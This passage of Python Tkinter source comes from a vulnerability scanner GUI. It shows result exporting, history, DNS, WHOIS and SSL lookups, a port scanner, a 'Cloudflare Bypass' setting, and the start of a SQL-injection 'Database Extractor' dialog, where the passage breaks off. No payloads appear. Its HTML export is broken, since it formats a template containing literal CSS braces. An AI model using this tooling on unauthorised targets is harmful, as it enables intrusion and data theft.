        # Sanitize output
        vuln = {k: escape(str(v)) for k, v in vuln.items()}
        
        self.vulnerability_count += 1
        self.vuln_count_label.config(text=str(self.vulnerability_count))
        
        # Update stats counter
        severity = vuln.get('severity', 'info').lower()
        if severity in self.stats_labels:
            current = int(self.stats_labels[severity].cget("text"))
            self.stats_labels[severity].config(text=str(current + 1))
        
        # Add to treeview
        timestamp = time.strftime("%H:%M:%S")
        values = (
            timestamp,
            vuln['type'],
            vuln['url'],
            vuln.get('severity', 'Info').capitalize(),
            vuln.get('confidence', 'Medium').capitalize()
        )
        
        self.tree.insert('', tk.END, values=values, tags=(severity,))
        self.tree.tag_configure('critical', background='#16213e', foreground='#ff3860')
        self.tree.tag_configure('high', background='#16213e', foreground='#ff7c4d')
        self.tree.tag_configure('medium', background='#16213e', foreground='#ffdd59')
        self.tree.tag_configure('low', background='#16213e', foreground='#48c774')
        self.tree.tag_configure('info', background='#16213e', foreground='#209cee')
        
        self.tree.see(self.tree.get_children()[-1])
        self.master.update_idletasks()
        
        # Update dashboard
        self.update_dashboard({
            'vulnerabilities': self.get_all_vulnerabilities(),
            'severity_counts': self.get_severity_counts(),
            'timeline': self.get_vulnerability_timeline()
        })

    def show_details(self, event):
        """Show details of selected vulnerability"""
        selected = self.tree.focus()
        if not selected:
            return
            
        item = self.tree.item(selected)
        self.details_text.delete(1.0, tk.END)
        
        # Clear previous action buttons
        for widget in self.details_actions.winfo_children():
            widget.destroy()
        
        # Display basic info
        self.details_text.insert(tk.END, f"Type: {item['values'][1]}\n")
        self.details_text.insert(tk.END, f"URL: {item['values'][2]}\n")
        self.details_text.insert(tk.END, f"Severity: {item['values'][3]}\n")
        self.details_text.insert(tk.END, f"Confidence: {item['values'][4]}\n\n")
        
        # Add action buttons
        ttk.Button(self.details_actions, 
                  text="Open in Browser", 
                  command=lambda: webbrowser.open(item['values'][2])).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(self.details_actions, 
                  text="Copy URL", 
                  command=lambda: self.master.clipboard_append(item['values'][2])).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(self.details_actions, 
                  text="Test Again", 
                  command=lambda: self.test_single_url(item['values'][2])).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(self.details_actions,
                  text="Mark as False Positive",
                  command=lambda: self.mark_false_positive(selected)).pack(side=tk.LEFT, padx=5)

    def test_single_url(self, url):
        """Test a single URL (for retesting vulnerabilities)"""
        if not self.scanning:
            test_thread = threading.Thread(
                target=self.scanner.test_url,
                args=(url,),
                daemon=True
            )
            test_thread.start()
            self.update_status(f"Testing single URL: {url}", "info")

    def mark_false_positive(self, item_id):
        """Mark a finding as false positive"""
        self.tree.delete(item_id)
        self.vulnerability_count -= 1
        self.vuln_count_label.config(text=str(self.vulnerability_count))
        self.update_status("Marked finding as false positive", "info")

    def show_export_menu(self):
        """Show export format menu"""
        menu = tk.Menu(self.master, tearoff=0, bg='#16213e', fg='#e0e0e0', activebackground='#0f3460')
        menu.add_command(label="JSON", command=lambda: self.export_results('json'))
        menu.add_command(label="CSV", command=lambda: self.export_results('csv'))
        menu.add_command(label="HTML", command=lambda: self.export_results('html'))
        menu.add_command(label="PDF", command=lambda: self.export_results('pdf'))
        menu.add_command(label="XML", command=lambda: self.export_results('xml'))
        menu.add_command(label="Markdown", command=lambda: self.export_results('md'))
        menu.post(self.export_btn.winfo_rootx(), self.export_btn.winfo_rooty() + self.export_btn.winfo_height())

    def export_results(self, format='json'):
        """Export scan results to file"""
        if not self.tree.get_children():
            messagebox.showwarning("Warning", "No results to export")
            return
            
        file_path = filedialog.asksaveasfilename(
            defaultextension=f".{format}",
            filetypes=[(f"{format.upper()} files", f"*.{format}")],
            title=f"Save Scan Results as {format.upper()}"
        )
        
        if file_path:
            try:
                file_path = os.path.normpath(file_path)  # Prevent directory traversal
                findings = self.get_all_vulnerabilities()
                
                if format == 'json':
                    with open(file_path, 'w', encoding='utf-8') as f:
                        json.dump(findings, f, indent=2)
                elif format == 'csv':
                    with open(file_path, 'w', encoding='utf-8', newline='') as f:
                        writer = csv.DictWriter(f, fieldnames=['time', 'type', 'url', 'severity', 'confidence'])
                        writer.writeheader()
                        writer.writerows(findings)
                elif format == 'html':
                    self.export_html(file_path, findings)
                elif format == 'pdf':
                    self.export_pdf(file_path, findings)
                elif format == 'xml':
                    self.export_xml(file_path, findings)
                elif format == 'md':
                    self.export_markdown(file_path, findings)
                
                self.update_status(f"Results exported to {file_path}", "success")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to export results: {str(e)}")
                logger.exception("Export failed")

    def export_html(self, file_path, findings):
        """Export results to HTML format"""
        html = """<!DOCTYPE html>
<html>
<head>
    <title>Cyber Blitz Scan Results</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #1a1a2e; color: #e0e0e0; }
        h1 { color: #4ecca3; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 8px; text-align: left; border-bottom: 1px solid #0f3460; }
        tr:nth-child(even) { background-color: #16213e; }
        .critical { color: #ff3860; font-weight: bold; }
        .high { color: #ff7c4d; font-weight: bold; }
        .medium { color: #ffdd59; }
        .low { color: #48c774; }
        .info { color: #209cee; }
        .summary { background-color: #16213e; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
        a { color: #4ecca3; text-decoration: none; }
        a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <h1>Cyber Blitz Vulnerability Scan Results</h1>
    <div class="summary">
        <p><strong>Scan Date:</strong> {scan_date}</p>
        <p><strong>Target URL:</strong> {target_url}</p>
        <p><strong>Total Findings:</strong> {total_findings}</p>
        <p><strong>Critical:</strong> <span class="critical">{critical_count}</span> | 
           <strong>High:</strong> <span class="high">{high_count}</span> | 
           <strong>Medium:</strong> <span class="medium">{medium_count}</span> | 
           <strong>Low:</strong> <span class="low">{low_count}</span> | 
           <strong>Info:</strong> <span class="info">{info_count}</span></p>
    </div>
    <table>
        <tr>
            <th>Time</th>
            <th>Type</th>
            <th>URL</th>
            <th>Severity</th>
            <th>Confidence</th>
        </tr>
""".format(
    scan_date=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    target_url=self.url_entry.get(),
    total_findings=len(findings),
    critical_count=self.stats_labels['critical'].cget("text"),
    high_count=self.stats_labels['high'].cget("text"),
    medium_count=self.stats_labels['medium'].cget("text"),
    low_count=self.stats_labels['low'].cget("text"),
    info_count=self.stats_labels['info'].cget("text")
)
        
        for item in findings:
            html += f"""
        <tr>
            <td>{item['time']}</td>
            <td class="{item['severity'].lower()}">{item['type']}</td>
            <td><a href="{item['url']}" target="_blank">{item['url']}</a></td>
            <td class="{item['severity'].lower()}">{item['severity']}</td>
            <td>{item['confidence']}</td>
        </tr>
"""
        
        html += """
    </table>
</body>
</html>
"""
        
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(html)

    def export_pdf(self, file_path, findings):
        """Export results to PDF format"""
        try:
            from reportlab.lib.pagesizes import letter
            from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
            from reportlab.lib.styles import getSampleStyleSheet
            from reportlab.lib import colors
            
            doc = SimpleDocTemplate(file_path, pagesize=letter)
            styles = getSampleStyleSheet()
            story = []
            
            # Title
            title = Paragraph("Cyber Blitz Vulnerability Scan Report", styles['Title'])
            story.append(title)
            story.append(Spacer(1, 12))
            
            # Summary
            summary_text = f"""
            <b>Scan Date:</b> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}<br/>
            <b>Target URL:</b> {self.url_entry.get()}<br/>
            <b>Total Findings:</b> {len(findings)}<br/>
            <b>Critical:</b> {self.stats_labels['critical'].cget("text")} 
            <b>High:</b> {self.stats_labels['high'].cget("text")} 
            <b>Medium:</b> {self.stats_labels['medium'].cget("text")} 
            <b>Low:</b> {self.stats_labels['low'].cget("text")} 
            <b>Info:</b> {self.stats_labels['info'].cget("text")}
            """
            summary = Paragraph(summary_text, styles['Normal'])
            story.append(summary)
            story.append(Spacer(1, 24))
            
            # Findings table
            data = [['Time', 'Type', 'URL', 'Severity', 'Confidence']]
            for item in findings:
                data.append([item['time'], item['type'], item['url'], item['severity'], item['confidence']])
            
            t = Table(data)
            t.setStyle(TableStyle([
                ('BACKGROUND', (0,0), (-1,0), colors.HexColor('#0f3460')),
                ('TEXTCOLOR', (0,0), (-1,0), colors.white),
                ('ALIGN', (0,0), (-1,-1), 'LEFT'),
                ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
                ('FONTSIZE', (0,0), (-1,0), 10),
                ('BOTTOMPADDING', (0,0), (-1,0), 12),
                ('BACKGROUND', (0,1), (-1,-1), colors.HexColor('#16213e')),
                ('TEXTCOLOR', (0,1), (-1,-1), colors.white),
                ('GRID', (0,0), (-1,-1), 1, colors.HexColor('#4ecca3')),
                ('FONTSIZE', (0,1), (-1,-1), 8),
            ]))
            
            story.append(t)
            doc.build(story)
            
        except ImportError:
            messagebox.showerror("Error", "PDF export requires reportlab module. Install with: pip install reportlab")

    def export_xml(self, file_path, findings):
        """Export results to XML format"""
        root = ET.Element("scan_results")
        header = ET.SubElement(root, "header")
        ET.SubElement(header, "date").text = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ET.SubElement(header, "target").text = self.url_entry.get()
        ET.SubElement(header, "findings_count").text = str(len(findings))
        
        findings_elem = ET.SubElement(root, "findings")
        for item in findings:
            finding = ET.SubElement(findings_elem, "finding")
            ET.SubElement(finding, "time").text = item['time']
            ET.SubElement(finding, "type").text = item['type']
            ET.SubElement(finding, "url").text = item['url']
            ET.SubElement(finding, "severity").text = item['severity']
            ET.SubElement(finding, "confidence").text = item['confidence']
        
        tree = ET.ElementTree(root)
        tree.write(file_path, encoding='utf-8', xml_declaration=True)

    def export_markdown(self, file_path, findings):
        """Export results to Markdown format"""
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(f"# Cyber Blitz Vulnerability Scan Report\n\n")
            f.write(f"**Scan Date**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"**Target URL**: {self.url_entry.get()}\n")
            f.write(f"**Total Findings**: {len(findings)}\n\n")
            
            f.write("## Findings Summary\n")
            f.write(f"- Critical: {self.stats_labels['critical'].cget('text')}\n")
            f.write(f"- High: {self.stats_labels['high'].cget('text')}\n")
            f.write(f"- Medium: {self.stats_labels['medium'].cget('text')}\n")
            f.write(f"- Low: {self.stats_labels['low'].cget('text')}\n")
            f.write(f"- Info: {self.stats_labels['info'].cget('text')}\n\n")
            
            f.write("## Vulnerabilities\n")
            f.write("| Time | Type | URL | Severity | Confidence |\n")
            f.write("|------|------|-----|----------|------------|\n")
            for item in findings:
                f.write(f"| {item['time']} | {item['type']} | {item['url']} | {item['severity']} | {item['confidence']} |\n")

    def get_all_vulnerabilities(self):
        """Get all vulnerabilities as dicts"""
        findings = []
        for item in self.tree.get_children():
            values = self.tree.item(item)['values']
            findings.append({
                'time': values[0],
                'type': values[1],
                'url': values[2],
                'severity': values[3],
                'confidence': values[4]
            })
        return findings

    def get_severity_counts(self):
        """Get current severity counts"""
        return {
            'critical': int(self.stats_labels['critical'].cget("text")),
            'high': int(self.stats_labels['high'].cget("text")),
            'medium': int(self.stats_labels['medium'].cget("text")),
            'low': int(self.stats_labels['low'].cget("text")),
            'info': int(self.stats_labels['info'].cget("text"))
        }

    def get_vulnerability_timeline(self):
        """Generate vulnerability timeline data"""
        timeline = []
        count = 0
        
        for item in self.tree.get_children():
            values = self.tree.item(item)['values']
            count += 1
            timeline.append({
                'time': values[0],
                'count': count
            })
        
        return timeline

    def show_settings(self):
        """Show settings dialog"""
        settings = tk.Toplevel(self.master)
        settings.title("Settings")
        settings.geometry("600x500")
        settings.resizable(False, False)
        settings.transient(self.master)
        settings.configure(bg='#1a1a2e')
        
        # Main settings frame
        main_frame = ttk.Frame(settings, style='TFrame')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Notebook for settings categories
        notebook = ttk.Notebook(main_frame)
        notebook.pack(fill=tk.BOTH, expand=True)
        
        # General settings tab
        general_frame = ttk.Frame(notebook, style='TFrame')
        notebook.add(general_frame, text="General")
        
        # Request settings
        ttk.Label(general_frame, text="Request Settings", font=('Segoe UI', 12, 'bold')).pack(anchor='w', pady=5)
        
        frame = ttk.Frame(general_frame, style='TFrame')
        frame.pack(fill=tk.X, padx=5, pady=5)
        ttk.Label(frame, text="Timeout (seconds):").pack(side=tk.LEFT)
        timeout_spin = ttk.Spinbox(frame, from_=1, to=60, width=5)
        timeout_spin.pack(side=tk.LEFT, padx=5)
        timeout_spin.set(self.timeout_spin.get())
        
        frame = ttk.Frame(general_frame, style='TFrame')
        frame.pack(fill=tk.X, padx=5, pady=5)
        ttk.Label(frame, text="User Agent:").pack(side=tk.LEFT)
        user_agent = ttk.Combobox(frame, 
                                values=["Random", "Chrome", "Firefox", "Safari", "Custom"],
                                state="readonly",
                                width=15)
        user_agent.pack(side=tk.LEFT, padx=5)
        user_agent.set("Random")
        
        # Cloudflare settings
        ttk.Label(general_frame, text="Cloudflare Bypass", font=('Segoe UI', 12, 'bold')).pack(anchor='w', pady=5)
        
        frame = ttk.Frame(general_frame, style='TFrame')
        frame.pack(fill=tk.X, padx=5, pady=5)
        ttk.Label(frame, text="Bypass Method:").pack(side=tk.LEFT)
        cf_method = ttk.Combobox(frame, 
                               values=["Automatic", "Cloudscraper", "Selenium"],
                               state="readonly",
                               width=15)
        cf_method.pack(side=tk.LEFT, padx=5)
        cf_method.set("Automatic")
        
        # Save button
        btn_frame = ttk.Frame(main_frame, style='TFrame')
        btn_frame.pack(fill=tk.X, pady=10)
        
        ttk.Button(btn_frame, text="Save", command=settings.destroy).pack(pady=10)
        ttk.Button(btn_frame, text="Cancel", command=settings.destroy).pack(pady=10)

    def open_documentation(self):
        """Open documentation in browser"""
        webbrowser.open("https://github.com/cyberblitz/scanner/wiki")

    def show_about(self):
        """Show about dialog"""
        about = tk.Toplevel(self.master)
        about.title("About Cyber Blitz")
        about.geometry("400x300")
        about.configure(bg='#1a1a2e')
        
        ttk.Label(about, text="Cyber Blitz Vulnerability Scanner", font=('Segoe UI', 14, 'bold'), foreground='#4ecca3').pack(pady=10)
        ttk.Label(about, text="Version 4.0", foreground='#e0e0e0').pack()
        ttk.Label(about, text="Advanced Security Assessment Tool", foreground='#e0e0e0').pack(pady=10)
        ttk.Label(about, text="© 2023 Cyber Blitz Project", foreground='#e0e0e0').pack()
        ttk.Label(about, text="License: MIT", foreground='#e0e0e0').pack(pady=10)
        
        logo_frame = ttk.Frame(about, style='TFrame')
        logo_frame.pack()
        ttk.Label(logo_frame, text="⚡", font=('Arial', 24), foreground='#4ecca3').pack()
        
        ttk.Button(about, text="OK", command=about.destroy, width=10).pack(pady=10)

    def load_config(self):
        """Load saved configuration"""
        config_file = "cyberblitz_config.json"
        if os.path.exists(config_file):
            try:
                with open(config_file, 'r') as f:
                    config = json.load(f)
                    self.url_entry.delete(0, tk.END)
                    self.url_entry.insert(0, config.get('target_url', ''))
                    self.threads_spin.set(config.get('threads', 10))
                    self.depth_spin.set(config.get('depth', 3))
                    self.rate_spin.set(config.get('rate_limit', 0.5))
                    self.timeout_spin.set(config.get('timeout', 10))
                    self.scan_types.set(config.get('scan_type', 'Full Scan'))
                    self.auth_type.set(config.get('auth_type', 'None'))
                    self.toggle_auth_fields()
                    self.auth_details.delete(0, tk.END)
                    self.auth_details.insert(0, config.get('auth_details', ''))
            except Exception as e:
                logger.error(f"Failed to load config: {str(e)}")

    def load_history(self):
        """Load scan history from database"""
        cursor = self.db_connection.cursor()
        cursor.execute('SELECT * FROM scan_history ORDER BY id DESC LIMIT 10')
        self.target_history = cursor.fetchall()
        
        cursor.execute('SELECT * FROM findings ORDER BY id DESC LIMIT 50')
        self.finding_history = cursor.fetchall()

    def save_to_history(self, target_url, scan_type):
        """Save scan to history"""
        cursor = self.db_connection.cursor()
        cursor.execute('''
        INSERT INTO scan_history (target_url, scan_type, start_time, findings_count, status)
        VALUES (?, ?, ?, ?, ?)
        ''', (
            target_url,
            scan_type,
            datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            0,
            'running'
        ))
        self.current_scan_id = cursor.lastrowid
        self.db_connection.commit()

    def show_history(self):
        """Show scan history dialog"""
        history = tk.Toplevel(self.master)
        history.title("Scan History")
        history.geometry("800x600")
        history.configure(bg='#1a1a2e')
        
        # Main frame
        main_frame = ttk.Frame(history, style='TFrame')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Treeview for history
        tree = ttk.Treeview(main_frame, columns=('id', 'target', 'type', 'time', 'findings', 'status'), show='headings')
        tree.heading('id', text='ID')
        tree.heading('target', text='Target URL')
        tree.heading('type', text='Scan Type')
        tree.heading('time', text='Start Time')
        tree.heading('findings', text='Findings')
        tree.heading('status', text='Status')
        
        tree.column('id', width=50, anchor='center')
        tree.column('target', width=250)
        tree.column('type', width=100, anchor='center')
        tree.column('time', width=150, anchor='center')
        tree.column('findings', width=80, anchor='center')
        tree.column('status', width=100, anchor='center')
        
        # Add scrollbars
        y_scroll = ttk.Scrollbar(main_frame, orient=tk.VERTICAL, command=tree.yview)
        y_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        tree.configure(yscrollcommand=y_scroll.set)
        
        tree.pack(fill=tk.BOTH, expand=True)
        
        # Populate history
        for item in self.target_history:
            tree.insert('', tk.END, values=(
                item[0],
                item[1],
                item[2],
                item[3],
                item[5],
                item[6]
            ))
        
        # Button to load history
        btn_frame = ttk.Frame(main_frame, style='TFrame')
        btn_frame.pack(fill=tk.X, pady=10)
        
        ttk.Button(btn_frame, text="Load Selected", command=lambda: self.load_from_history(tree)).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Close", command=history.destroy).pack(side=tk.RIGHT, padx=5)

    def load_from_history(self, tree):
        """Load scan from history"""
        selected = tree.focus()
        if not selected:
            return
            
        item = tree.item(selected)
        self.url_entry.delete(0, tk.END)
        self.url_entry.insert(0, item['values'][1])
        self.scan_types.set(item['values'][2])

    def load_config_dialog(self):
        """Load configuration from file dialog"""
        if self.scanning:
            messagebox.showwarning("Warning", "Cannot load config during scan")
            return
            
        file_path = filedialog.askopenfilename(
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")],
            title="Load Configuration"
        )
        
        if file_path:
            try:
                with open(file_path, 'r') as f:
                    config = json.load(f)
                    self.url_entry.delete(0, tk.END)
                    self.url_entry.insert(0, config.get('target_url', ''))
                    self.threads_spin.set(config.get('threads', 10))
                    self.depth_spin.set(config.get('depth', 3))
                    self.rate_spin.set(config.get('rate_limit', 0.5))
                    self.timeout_spin.set(config.get('timeout', 10))
                    self.scan_types.set(config.get('scan_type', 'Full Scan'))
                    self.auth_type.set(config.get('auth_type', 'None'))
                    self.toggle_auth_fields()
                    self.auth_details.delete(0, tk.END)
                    self.auth_details.insert(0, config.get('auth_details', ''))
                    
                    self.update_status(f"Loaded configuration from {file_path}", "success")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to load config: {str(e)}")

    def save_config(self):
        """Save current configuration"""
        config = {
            'target_url': self.url_entry.get(),
            'threads': int(self.threads_spin.get()),
            'depth': int(self.depth_spin.get()),
            'rate_limit': float(self.rate_spin.get()),
            'timeout': int(self.timeout_spin.get()),
            'scan_type': self.scan_types.get(),
            'auth_type': self.auth_type.get(),
            'auth_details': self.auth_details.get() if self.auth_type.get() != "None" else ""
        }
        
        try:
            with open("cyberblitz_config.json", 'w') as f:
                json.dump(config, f, indent=2)
        except Exception as e:
            logger.error(f"Failed to save config: {str(e)}")

    def save_config_dialog(self):
        """Save configuration to file dialog"""
        config = {
            'target_url': self.url_entry.get(),
            'threads': int(self.threads_spin.get()),
            'depth': int(self.depth_spin.get()),
            'rate_limit': float(self.rate_spin.get()),
            'timeout': int(self.timeout_spin.get()),
            'scan_type': self.scan_types.get(),
            'auth_type': self.auth_type.get(),
            'auth_details': self.auth_details.get() if self.auth_type.get() != "None" else ""
        }
        
        file_path = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")],
            title="Save Configuration"
        )
        
        if file_path:
            try:
                with open(file_path, 'w') as f:
                    json.dump(config, f, indent=2)
                self.update_status(f"Saved configuration to {file_path}", "success")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save config: {str(e)}")

    def show_network_info(self):
        """Show network information dialog"""
        url = self.url_entry.get().strip()
        if not url:
            messagebox.showwarning("Warning", "Please enter a target URL first")
            return
            
        try:
            parsed = urlparse(url)
            if not parsed.scheme:
                url = "http://" + url
                parsed = urlparse(url)
            
            hostname = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            
            info_window = tk.Toplevel(self.master)
            info_window.title(f"Network Information: {hostname}")
            info_window.geometry("600x400")
            info_window.configure(bg='#1a1a2e')
            
            text = scrolledtext.ScrolledText(info_window, 
                                           wrap=tk.WORD,
                                           width=70,
                                           height=20,
                                           font=('Consolas', 10),
                                           bg='#16213e',
                                           fg='#e0e0e0')
            text.pack(fill=tk.BOTH, expand=True)
            
            # Add network info
            text.insert(tk.END, f"Target: {hostname}\n")
            text.insert(tk.END, f"Port: {port}\n")
            text.insert(tk.END, f"Scheme: {parsed.scheme}\n\n")
            
            # Get IP address
            try:
                ip = socket.gethostbyname(hostname)
                text.insert(tk.END, f"IP Address: {ip}\n")
                
                # Get WHOIS information
                try:
                    whois_info = whois.whois(hostname)
                    text.insert(tk.END, "\nWHOIS Information:\n")
                    text.insert(tk.END, f"Registrar: {whois_info.registrar}\n")
                    text.insert(tk.END, f"Creation Date: {whois_info.creation_date}\n")
                    text.insert(tk.END, f"Expiration Date: {whois_info.expiration_date}\n")
                except Exception as e:
                    text.insert(tk.END, f"\nWHOIS Error: {str(e)}\n")
            except socket.gaierror:
                text.insert(tk.END, "Could not resolve hostname\n")
            
            # Check SSL certificate
            if parsed.scheme == 'https':
                text.insert(tk.END, "\nSSL Certificate:\n")
                try:
                    context = ssl.create_default_context()
                    with socket.create_connection((hostname, port), timeout=5) as sock:
                        with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                            cert = ssock.getpeercert()
                            text.insert(tk.END, f"Issuer: {cert['issuer'][1][0][1]}\n")
                            text.insert(tk.END, f"Valid From: {cert['notBefore']}\n")
                            text.insert(tk.END, f"Valid Until: {cert['notAfter']}\n")
                            text.insert(tk.END, f"Version: {cert.get('version', 'N/A')}\n")
                            text.insert(tk.END, f"Serial Number: {cert.get('serialNumber', 'N/A')}\n")
                except Exception as e:
                    text.insert(tk.END, f"SSL Error: {str(e)}\n")
            
            # DNS information
            try:
                text.insert(tk.END, "\nDNS Information:\n")
                resolver = dns.resolver.Resolver()
                
                # A records
                try:
                    a_records = resolver.resolve(hostname, 'A')
                    text.insert(tk.END, "A Records:\n")
                    for record in a_records:
                        text.insert(tk.END, f"- {record.address}\n")
                except:
                    pass
                
                # MX records
                try:
                    mx_records = resolver.resolve(hostname, 'MX')
                    text.insert(tk.END, "\nMX Records:\n")
                    for record in mx_records:
                        text.insert(tk.END, f"- {record.exchange} (Priority: {record.preference})\n")
                except:
                    pass
                
                # TXT records
                try:
                    txt_records = resolver.resolve(hostname, 'TXT')
                    text.insert(tk.END, "\nTXT Records:\n")
                    for record in txt_records:
                        text.insert(tk.END, f"- {record.strings}\n")
                except:
                    pass
            except Exception as e:
                text.insert(tk.END, f"\nDNS Error: {str(e)}\n")
            
            text.config(state=tk.DISABLED)
        except Exception as e:
            messagebox.showerror("Error", f"Could not get network info: {str(e)}")

    def show_tech_stack(self):
        """Show technology stack detection results"""
        if not self.scanner or not hasattr(self.scanner, 'modules') or 'tech' not in self.scanner.modules:
            messagebox.showwarning("Warning", "Technology detection module not available")
            return
            
        url = self.url_entry.get().strip()
        if not url:
            messagebox.showwarning("Warning", "Please enter a target URL first")
            return
            
        try:
            parsed = urlparse(url)
            if not parsed.scheme:
                url = "http://" + url
            
            tech_window = tk.Toplevel(self.master)
            tech_window.title("Technology Stack Detection")
            tech_window.geometry("600x400")
            tech_window.configure(bg='#1a1a2e')
            
            tree = ttk.Treeview(tech_window, columns=('technology', 'confidence', 'evidence'), show='headings')
            tree.heading('technology', text='Technology')
            tree.heading('confidence', text='Confidence')
            tree.heading('evidence', text='Evidence')
            tree.column('technology', width=150)
            tree.column('confidence', width=100)
            tree.column('evidence', width=300)
            
            y_scroll = ttk.Scrollbar(tech_window, orient=tk.VERTICAL, command=tree.yview)
            y_scroll.pack(side=tk.RIGHT, fill=tk.Y)
            tree.configure(yscrollcommand=y_scroll.set)
            
            tree.pack(fill=tk.BOTH, expand=True)
            
            # Run technology detection
            findings = self.scanner.modules['tech'].scan(url, "")
            
            if not findings:
                tree.insert('', tk.END, values=("No technologies detected", "", ""))
            else:
                for finding in findings:
                    tree.insert('', tk.END, values=(
                        finding.get('details', '').replace('Detected ', ''),
                        finding.get('confidence', 'Medium'),
                        finding.get('evidence', '')
                    ))
        except Exception as e:
            messagebox.showerror("Error", f"Technology detection failed: {str(e)}")

    def show_port_scanner(self):
        """Show port scanner dialog"""
        url = self.url_entry.get().strip()
        if not url:
            messagebox.showwarning("Warning", "Please enter a target URL first")
            return
            
        try:
            parsed = urlparse(url)
            hostname = parsed.hostname
            
            port_window = tk.Toplevel(self.master)
            port_window.title(f"Port Scanner: {hostname}")
            port_window.geometry("600x400")
            port_window.configure(bg='#1a1a2e')
            
            # Port range selection
            range_frame = ttk.Frame(port_window)
            range_frame.pack(fill=tk.X, padx=10, pady=10)
            
            ttk.Label(range_frame, text="Port Range:").pack(side=tk.LEFT)
            start_port = ttk.Spinbox(range_frame, from_=1, to=65535, width=6)
            start_port.pack(side=tk.LEFT, padx=5)
            start_port.set(1)
            
            ttk.Label(range_frame, text="to").pack(side=tk.LEFT)
            end_port = ttk.Spinbox(range_frame, from_=1, to=65535, width=6)
            end_port.pack(side=tk.LEFT, padx=5)
            end_port.set(100)
            
            # Scan button
            scan_btn = ttk.Button(range_frame, text="Scan", command=lambda: self.run_port_scan(
                hostname, int(start_port.get()), int(end_port.get()), result_text
            ))
            scan_btn.pack(side=tk.RIGHT)
            
            # Results
            result_text = scrolledtext.ScrolledText(port_window, 
                                                  wrap=tk.WORD,
                                                  width=70,
                                                  height=20,
                                                  font=('Consolas', 10),
                                                  bg='#16213e',
                                                  fg='#e0e0e0')
            result_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
            
            result_text.insert(tk.END, f"Ready to scan ports on {hostname}\n")
            result_text.insert(tk.END, "Select port range and click Scan\n")
        except Exception as e:
            messagebox.showerror("Error", f"Port scanner initialization failed: {str(e)}")

    def run_port_scan(self, hostname, start_port, end_port, result_text):
        """Run port scan in background thread"""
        if start_port > end_port:
            messagebox.showwarning("Warning", "Start port must be less than end port")
            return
            
        if (end_port - start_port) > 1000:
            if not messagebox.askyesno("Warning", "Scanning more than 1000 ports may take a long time. Continue?"):
                return
        
        result_text.delete(1.0, tk.END)
        result_text.insert(tk.END, f"Scanning ports {start_port}-{end_port} on {hostname}...\n")
        
        scan_thread = threading.Thread(
            target=self._perform_port_scan,
            args=(hostname, start_port, end_port, result_text),
            daemon=True
        )
        scan_thread.start()

    def _perform_port_scan(self, hostname, start_port, end_port, result_text):
        """Perform the actual port scan"""
        try:
            open_ports = []
            
            for port in range(start_port, end_port + 1):
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(1)
                        result = s.connect_ex((hostname, port))
                        if result == 0:
                            try:
                                service = socket.getservbyport(port, 'tcp')
                            except:
                                service = "Unknown"
                            open_ports.append((port, service))
                            result_text.insert(tk.END, f"Port {port} ({service}) is open\n")
                            result_text.see(tk.END)
                except:
                    continue
            
            result_text.insert(tk.END, f"\nScan completed. Found {len(open_ports)} open ports.\n")
            
            if open_ports:
                result_text.insert(tk.END, "\nOpen ports:\n")
                for port, service in open_ports:
                    result_text.insert(tk.END, f"- Port {port}: {service}\n")
        except Exception as e:
            result_text.insert(tk.END, f"\nError during scan: {str(e)}\n")
        finally:
            result_text.insert(tk.END, "\nPort scan finished\n")

    def show_db_extractor(self):
        """Show database extractor dialog"""
        db_window = tk.Toplevel(self.master)
        db_window.title("Database Extractor")
        db_window.geometry("800x600")
        db_window.configure(bg='#1a1a2e')
        
        # Main frame
        main_frame = ttk.Frame(db_window, style='TFrame')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Target URL
        url_frame = ttk.Frame(main_frame, style='TFrame')
        url_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(url_frame, text="Vulnerable URL:", style='TLabel').pack(side=tk.LEFT)
        url_entry = ttk.Entry(url_frame, width=50, style='TEntry')
        url_entry.pack(side=tk.LEFT, padx=10, fill=tk.X, expand=True)
        
        # Parameters
        param_frame = ttk.Frame(main_frame, style='TFrame')
        param_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(param_frame, text="Vulnerable Parameter:", style='TLabel').pack(side=tk.LEFT)
        param_entry = ttk.Entry(param_frame, width=30, style='TEntry')
        param_entry.pack(side=tk.LEFT, padx=10)
        
        # Database type
        db_frame = ttk.Frame(main_frame, style='TFrame')
        db_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(db_frame, text="Database Type:", style='TLabel').pack(side=tk.LEFT)
        db_type = ttk.Combobox(db_frame, 
                              values=["MySQL", "PostgreSQL", "Oracle", "SQL Server", "SQLite"],
                              state="readonly",
                              width=12)
        db_type.pack(side=tk.LEFT, padx=10)
        db_type.set("MySQL")
        
        # Extract button
        btn_frame = ttk.Frame(main_frame, style='TFrame')
